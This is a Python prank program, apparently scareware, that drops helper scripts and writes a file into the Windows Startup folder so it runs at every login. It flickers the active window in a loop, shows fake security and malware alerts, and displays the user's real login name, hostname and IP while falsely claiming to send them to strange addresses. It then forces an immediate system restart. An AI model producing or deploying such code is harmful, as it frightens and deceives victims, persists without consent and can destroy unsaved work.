import os
import subprocess
import platform

# Path to the Startup folder for `iquit.py`
startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
iquit_path = os.path.join(startup_path, "iquit.py")

# Define each script's content
scripts = {
    "main_effect.py": '''
import ctypes
import time
import math
import subprocess

user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32
hwnd = user32.GetForegroundWindow()

def overlay_tunnel_spectrum(hwnd):
    hdc = user32.GetDC(hwnd)
    width = user32.GetSystemMetrics(0)
    height = user32.GetSystemMetrics(1)

    alpha = 128
    shift_x, shift_y = 0, 0
    color_hue = 0

    while True:
        overlay_color = (alpha << 24) | 0x000000
        gdi32.SetBkColor(hdc, overlay_color)
        user32.RedrawWindow(hwnd, None, None, 0x0400)

        shift_x = (shift_x + 1) % width
        shift_y = (shift_y + 1) % height
        user32.SetWindowPos(hwnd, 0, shift_x, shift_y, width, height, 0x0001)

        color_hue = (color_hue + 1) % 360
        red = int((1 + math.cos(color_hue * math.pi / 180)) * 127.5)
        green = int((1 + math.cos((color_hue + 120) * math.pi / 180)) * 127.5)
        blue = int((1 + math.cos((color_hue + 240) * math.pi / 180)) * 127.5)
        color_spectrum = (red << 16) | (green << 8) | blue

        gdi32.SetBkColor(hdc, color_spectrum)
        user32.RedrawWindow(hwnd, None, None, 0x0400)
        time.sleep(0.02)

    user32.ReleaseDC(hwnd, hdc)

if __name__ == "__main__":
    overlay_tunnel_spectrum(hwnd)
''',

    "monitor.py": '''
import time
import subprocess
import psutil

def is_main_effect_running():
    for process in psutil.process_iter(attrs=["pid", "name"]):
        if process.info["name"] == "python.exe":
            for cmd in process.cmdline():
                if "main_effect.py" in cmd:
                    return True
    return False

# Check if main_effect.py is running; if not, start it
if not is_main_effect_running():
    print("Starting main_effect.py from monitor.py...")
    subprocess.Popen(["python", "main_effect.py"])

# Monitor main_effect.py
while True:
    if not is_main_effect_running():
        print("main_effect.py is not running; starting distractions.py...")
        subprocess.Popen(["python", "distractions.py"])
        break
    time.sleep(1)
''',

    "distractions.py": '''
import os
import time
import pyautogui
import platform
import socket
import subprocess
import random
from tkinter import messagebox, Tk

def open_notepad_and_type(message, delay=0.01):  # Faster typing speed
    subprocess.Popen("notepad.exe")
    time.sleep(1)
    for char in message:
        pyautogui.write(char)
        time.sleep(delay)

def show_error_message(title, message):
    root = Tk()
    root.withdraw()
    messagebox.showerror(title, message)
    root.destroy()

initial_message = """
Hello there! 👋

I see you found me. While I appreciate the curiosity, it's a bit rude to snoop around, don't you think? 😉

Maybe next time, you should let things be. You never know what you might accidentally uncover... or unleash! 😱

But hey, since you're here, remember that curiosity killed the cat! Or at least, made the cat very, very confused.

Now, go on, and have a great day! But maybe stop poking around. 😆

Yours truly,
Your Friendly Program
"""
open_notepad_and_type(initial_message)
time.sleep(15)
show_error_message("Attention!", "Are you paying attention?")

distraction_messages = [
    "Error: Connection Lost",
    "Warning: Data Corruption Detected",
    "Alert: Unauthorized Access Attempted",
    "Security Alert: Potential Malware Found",
]
for _ in range(5):
    random_message = random.choice(distraction_messages)
    show_error_message("System Alert", random_message)
    time.sleep(2)

system_info = f"""
Collecting system information...

User: {os.getlogin()}
Computer Name: {socket.gethostname()}
Operating System: {platform.system()} {platform.release()}
Processor: {platform.processor()}
IP Address: {socket.gethostbyname(socket.gethostname())}

Preparing to send information to contacts:
- j4f**@corrupt.net
- user_xxx@unknown.domain
- $tr@ngename@domain.com
- unreadable@user{random.randint(100, 999)}.xyz
- [scrambled]@inbound.mail

Sending...
"""
open_notepad_and_type(system_info, delay=0.01)  # Faster typing speed

def create_startup_script():
    startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    iquit_path = os.path.join(startup_path, "iquit.py")
    
    iquit_content = """
import tkinter as tk

root = tk.Tk()
root.title("Victory")
root.geometry("300x200")

label = tk.Label(root, text="Alright alright, you win...\\n\\nWritten by Zenny\\nHope I gave you a laugh", font=("Arial", 12), justify="center")
label.pack(pady=20)

root.mainloop()
"""

    with open(iquit_path, "w", encoding="utf-8") as file:
        file.write(iquit_content)

create_startup_script()
time.sleep(5)
os.system("shutdown /r /t 1")
''',

    "iquit.py": """
import tkinter as tk

root = tk.Tk()
root.title("Victory")
root.geometry("300x200")

label = tk.Label(root, text="Alright alright, you win...\\n\\nWritten by Zenny\\nHope I gave you a laugh", font=("Arial", 12), justify="center")
label.pack(pady=20)

root.mainloop()
"""
}

# Write each script to its respective file with UTF-8 encoding
for filename, script_content in scripts.items():
    with open(filename, 'w', encoding="utf-8") as file:
        file.write(script_content)

# Place 'iquit.py' in the Startup folder with UTF-8 encoding
with open(iquit_path, "w", encoding="utf-8") as startup_file:
    startup_file.write(scripts["iquit.py"])

# Run monitor.py in a completely new terminal window
print("Starting monitor.py in a separate terminal to begin the sequence...")
if platform.system() == "Windows":
    subprocess.Popen(["start", "cmd", "/k", "python monitor.py"], shell=True)
elif platform.system() == "Darwin":  # macOS
    subprocess.Popen(["open", "-a", "Terminal", "python monitor.py"])
elif platform.system() == "Linux":
    subprocess.Popen(["xterm", "-e", "python3 monitor.py"])
print("monitor.py has been started in a separate terminal.")
